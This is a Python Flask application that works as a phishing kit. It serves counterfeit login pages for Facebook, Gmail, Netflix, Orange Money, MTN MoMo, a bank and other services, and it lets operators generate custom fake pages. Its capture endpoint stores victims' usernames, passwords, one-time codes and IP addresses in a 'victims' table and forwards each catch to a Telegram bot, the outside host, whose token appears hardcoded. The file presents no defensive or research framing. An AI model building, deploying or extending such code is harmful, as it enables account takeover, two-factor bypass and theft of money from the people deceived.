import os
from flask import Flask, request, jsonify, render_template
import requests
import datetime
import sqlite3

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "VOTRE_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "VOTRE_CHAT_ID")
DB_NAME = 'abeilles.db'

# Dictionnaire des logos / émojis officiels par plateforme pour Telegram
PLATFORM_LOGOS = {
    "Facebook": "📘 [Facebook]",
    "Instagram": "📸 [Instagram]",
    "TikTok": "🎵 [TikTok]",
    "Gmail": "✉️ [Gmail]",
    "Netflix": "🎬 [Netflix]",
    "Telegram": "✈️ [Telegram]",
    "Amazon": "📦 [Amazon]",
    "Snapchat": "👻 [Snapchat]",
    "PUBG Mobile": "🎮 [PUBG]",
    "Portail Abeilles": "🐝 [Abeilles]",
    "Orange Money": "🟠 [Orange Money]",
    "MTN MoMo": "🟡 [MTN MoMo]",
    "Banque Atlantique": "🏦 [Banque Atlantique]"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/phish/<platform_name>')
def render_phish_page(platform_name):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (platform_name,))
    cp = cursor.fetchone()
    conn.close()

    if cp:
        import json
        config = {
            "title": cp["title"],
            "network": cp["network"],
            "bg_type": cp["bg_type"],
            "bg_value": cp["bg_value"],
            "logo_url": cp["logo_url"],
            "logo_shape": cp["logo_shape"],
            "fields": json.loads(cp["fields_json"]),
            "btn_text": cp["btn_text"]
        }
        return render_template('custom_login.html', config=config)

    # Gestion des routes OTP vs Standard (ex: /phish/facebook_otp ou /phish/facebook)
    template_file = f"{platform_name.lower()}.html"
    try:
        return render_template(template_file)
    except Exception:
        return "Page introuvable", 404

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json
    slug = data.get('slug', '').lower().replace(' ', '_')
    if not slug:
        return jsonify({"status": "error", "message": "Slug invalide"}), 400
    
    import json
    conn = get_db_connection()
    cursor = conn.cursor()
    try:
        cursor.execute('''
            INSERT OR REPLACE INTO custom_pages (slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            slug,
            data.get('title', 'Connexion Sécurisée'),
            data.get('network', 'Portail Bancaire/Service'),
            data.get('bgType', 'color'),
            data.get('bgValue', '#ffffff'),
            data.get('logoUrl', ''),
            data.get('logoShape', 'circle'),
            json.dumps(data.get('fields', [])),
            data.get('btnText', 'Valider')
        ))
        conn.commit()
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        conn.close()

    return jsonify({"status": "success", "url": f"/phish/{slug}"})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json
    owner = data.get('owner', 'Inconnu')
    network = data.get('network', 'Plateforme')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    v_ip = request.remote_addr
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    # Enregistrement persistant dans la base SQLite
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    # Récupération du logo de la plateforme pour l'alerte Telegram
    platform_brand = PLATFORM_LOGOS.get(network, f"🌐 [{network}]")

    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"{platform_brand}\n"
        f"👤 *Propriétaire du lien:* `{owner}`\n"
        f"📋 *Type de flux:* `{v_type.upper()}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *Code OTP:* `{v_otp}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *Adresse IP:* `{v_ip}`"
    )
    send_telegram_notification(alert_text)

    return jsonify({"status": "success", "message": "Captured and saved successfully"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
